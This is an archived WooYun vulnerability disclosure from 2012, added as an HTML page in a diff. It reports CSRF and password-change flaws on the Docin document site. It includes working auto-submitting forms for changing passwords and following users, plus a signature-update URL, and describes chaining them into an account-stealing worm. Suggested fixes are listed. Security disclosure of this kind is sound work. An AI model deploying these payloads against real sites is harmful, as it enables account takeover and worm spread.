@@ -1,0 +1,302 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		豆丁网N处CSRF漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		豆丁网N处CSRF漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/imlonghao">imlonghao</a> 
+</li><li>提交时间：		2012-06-26 11:50</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-06-26：	积极联系厂商并且等待厂商认领中，细节不对外公开<br/>
+									2012-08-10：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">N处CSRF漏洞，不多解释，RK20你懂的</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">【漏洞一】<br />
+<br />
+某天，对豆丁网的修改密码的设计进行了一下分析。<br />
+<br />
+修改密码需要输入3个内容，一个旧密码，一个新密码，一个新密码确认。<br />
+<br />
+确定需要三个框都是绿色钩钩，其中，旧密码的验证也存在缺陷。<br />
+<br />
+通过判断http://www.docin.com/app/my/docin/checkOldPwd?password=XXXXXXXXXXX返回的结果来判断用户输入的密码是否为真，ture和false，这个过程存在一定缺陷，在拿到用户COOKIES的情况下，利用穷举或者密码库，很容易就可以测试出用户的原密码。<br />
+<br />
+<br />
+<br />
+=========华丽的分割线=========<br />
+<br />
+<br />
+<br />
+【漏洞二】<br />
+<br />
+在修改密码POST的表单中，POST了三个参数，分别是oldPwd、newPwd、newPwdAgain<br />
+<br />
+但是，在我的测试当中，删掉oldPwd和newPwdAgain参数，只保留newPwd并进行POST操作，依然可以修改用户的密码，这就导致了可能会在获得了用户COOKIES的情况下，在未知旧密码的情况下强制修改用户的密码。<br />
+<br />
+<br />
+<br />
+=========华丽的分割线=========<br />
+<br />
+<br />
+<br />
+【漏洞三】<br />
+<br />
+修改密码的接口http://www.docin.com/app/my/docin/password?fn=update ，未验证POST表单的来路，结合漏洞二，在豆丁中传播一个带有以下代码的地址，就可以实现任意修改用户密码。<br />
+<br />
+</p><pre><code>&lt;html&gt;<br />
+&lt;body&gt;<br />
+&lt;form id=&quot;imlonghao&quot; name=&quot;imlonghao&quot; action=&quot;http://www.docin.com/app/my/docin/password?fn=update&quot; method=&quot;post&quot;&gt;<br />
+&lt;input type=&quot;text&quot; name=&quot;newPwd&quot; value=&quot;XXXXXXXXXXX&quot; /&gt;<br />
+&lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;<br />
+&lt;/form&gt;<br />
+&lt;script&gt;<br />
+	document.imlonghao.submit();<br />
+&lt;/script&gt;<br />
+&lt;/body&gt;<br />
+&lt;/html&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+=========华丽的分割线=========<br />
+<br />
+<br />
+<br />
+【漏洞四】<br />
+<br />
+想了想，只是修改用户的密码，但不知道用户的帐号，要利用也只能达到盗取指定用户的帐号的目的，并不能广泛的进行蠕虫传播。<br />
+<br />
+于是，我想到了可以用CSRF操作被害用户的帐号关注一个人气小的帐号，那么就可以知道用户的帐号了。<br />
+<br />
+很荣幸，关注接口也没有做来源检查。<br />
+<br />
+接口地址：http://www.docin.com/app/my/docin/addConcernUser<br />
+<br />
+</p><pre><code>&lt;html&gt;<br />
+&lt;body&gt;<br />
+&lt;form id=&quot;imlonghao&quot; name=&quot;imlonghao&quot; action=&quot;http://www.docin.com/app/my/docin/addConcernUser&quot; method=&quot;post&quot;&gt;<br />
+&lt;input type=&quot;text&quot; name=&quot;fansUserId&quot; value=&quot;XXX&quot; /&gt;<br />
+&lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;<br />
+&lt;/form&gt;<br />
+&lt;script&gt;<br />
+	document.imlonghao.submit();<br />
+&lt;/script&gt;<br />
+&lt;/body&gt;<br />
+&lt;/html&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+=========华丽的分割线=========<br />
+<br />
+<br />
+<br />
+【漏洞五】<br />
+<br />
+想要达到传播蠕虫的目的，还需要一个类似于发微博的东西，于是，我想到了修改用户签名的做法。<br />
+<br />
+很很很荣幸，也没有检查来源。<br />
+<br />
+利用方式：<br />
+<br />
+</p><pre><code>http://www.docin.com/jsp_cn/userBlog/userdoc/updateaboutme.jsp?content=[在这里输入你想修改的签名]</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+=========华丽的分割线=========<br />
+<br />
+<br />
+<br />
+华丽丽的，一个盗号蠕虫就这样制成了。<br />
+<br />
+<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">【漏洞一】<br />
+<br />
+</p><p class="detail"><a href="../images/26113627d7b3beeccf667761aa2ba27c0cb12a6e.png" target="_blank"><img src="../images/26113627d7b3beeccf667761aa2ba27c0cb12a6e.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/26113632570e3db535086317d8188c27fb5b3710.png" target="_blank"><img src="../images/26113632570e3db535086317d8188c27fb5b3710.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+=========华丽的分割线=========<br />
+<br />
+<br />
+<br />
+【漏洞二】<br />
+<br />
+【漏洞三】<br />
+<br />
+</p><p class="detail"><a href="../images/261139254922c4f7eff86010d59b142c8f3bee97.gif" target="_blank"><img src="../images/261139254922c4f7eff86010d59b142c8f3bee97.gif" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+=========华丽的分割线=========<br />
+<br />
+<br />
+<br />
+【漏洞四】<br />
+<br />
+随便找了一个人<br />
+<br />
+</p><p class="detail"><a href="../images/2611405263f33c54dcf029e1d37832437c1dceb3.png" target="_blank"><img src="../images/2611405263f33c54dcf029e1d37832437c1dceb3.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+=========华丽的分割线=========<br />
+<br />
+<br />
+<br />
+【漏洞五】<br />
+<br />
+原签名<br />
+<br />
+</p><p class="detail"><a href="../images/261142191b6499f6c5bdd7dd5a5a75a8d8952e27.png" target="_blank"><img src="../images/261142191b6499f6c5bdd7dd5a5a75a8d8952e27.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+接口返回信息<br />
+<br />
+</p><p class="detail"><a href="../images/2611422913d2b4e2156fa7ffa74aa7e91412e966.png" target="_blank"><img src="../images/2611422913d2b4e2156fa7ffa74aa7e91412e966.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+修改后<br />
+<br />
+</p><p class="detail"><a href="../images/26114238a857589079390a4100c59f68621cac6f.png" target="_blank"><img src="../images/26114238a857589079390a4100c59f68621cac6f.png" alt="" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">漏洞一：取消这个验证，将旧密码的验证转入到按确定提交后POST到服务器后在验证<br />
+<br />
+漏洞二：严格验证POST的参数是否齐全<br />
+<br />
+漏洞三：严格验证POST表单来源<br />
+<br />
+漏洞四：同上<br />
+<br />
+漏洞五：同上 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/imlonghao" title="imlonghao">imlonghao</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-08789" title="豆丁网N处CSRF漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+									<h3 class="detailTitle">厂商回应：</h3>
+										<p class="detail">未能联系到厂商或者厂商积极拒绝</p>
+																<p class="detail">漏洞Rank：10 (WooYun评价)</p>
+												
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="8789";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
